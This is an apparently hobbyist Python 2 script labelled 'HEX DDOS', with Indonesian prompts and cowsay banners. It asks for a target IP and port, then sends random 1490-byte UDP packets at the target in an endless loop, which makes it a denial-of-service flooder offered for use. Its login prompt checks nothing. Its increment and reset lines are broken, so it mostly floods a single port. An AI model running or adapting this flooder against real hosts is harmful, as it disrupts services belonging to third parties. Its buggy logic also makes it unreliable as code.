import os
import sys
import time
import datetime
import socket
import random
import getpass
import itertools
import threading
import time
import sys

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
os.system("cowsay -f eyes selamat datang")
print"           masukin nama dulu kaka   "
user = raw_input ('masukan user: ')
pw = getpass.getpass("masukan password: ")
os.system("clear")
print("selamat datang "+ user)
#==============================#
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#==============================#

os.system("clear")
os.system("cowsay -f dragon.cow HEX DDOS")
print(60 *"=")
print """

    [+]AUTHOR : HEX.id
    [+]TIME   : X-TIME BOGOR

    """
print(60 *"=")

ip = raw_input("masukan ip: ")
port = input("masukan port: ")
os.system("clear")
os.system("cowsay -f ren.cow start")

os.system('clear')
time.sleep(2)
done = False

#animasi loading
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r login now ')

t = threading.Thread(target=animate)
t.start()

#proses lama disini

time.sleep(10)
done = True
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes,(ip,port))
    terkirim = + 1
    port = + 1 
    print "terkirim"
    if port == 65534:
        port == 1
        